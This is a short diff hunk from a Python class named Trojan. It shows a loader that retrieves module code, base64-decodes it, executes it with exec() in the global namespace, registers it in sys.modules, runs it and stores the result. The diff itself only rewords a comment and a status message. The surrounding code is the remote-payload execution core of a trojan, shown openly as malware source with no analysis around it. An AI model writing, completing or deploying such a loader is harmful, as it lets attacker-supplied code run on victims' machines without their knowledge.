@@ -94,10 +94,10 @@ class Trojan:
                 if module_code:
                     print(f"[*] Module code retrieved successfully for '{module_name}'")
                     exec(base64.b64decode(module_code).decode('utf-8'), globals())
-                    # Manually add the module to sys.modules
+                    # Check if the module was properly loaded
                     if module_name in globals():
                         sys.modules[module_name] = globals()[module_name]
-                        print(f"[*] Module '{module_name}' successfully loaded and running...")
+                        print(f"[*] Module '{module_name}' successfully loaded.")
                         result = sys.modules[module_name].run()
                         self.store_module_result(result)
                     else:
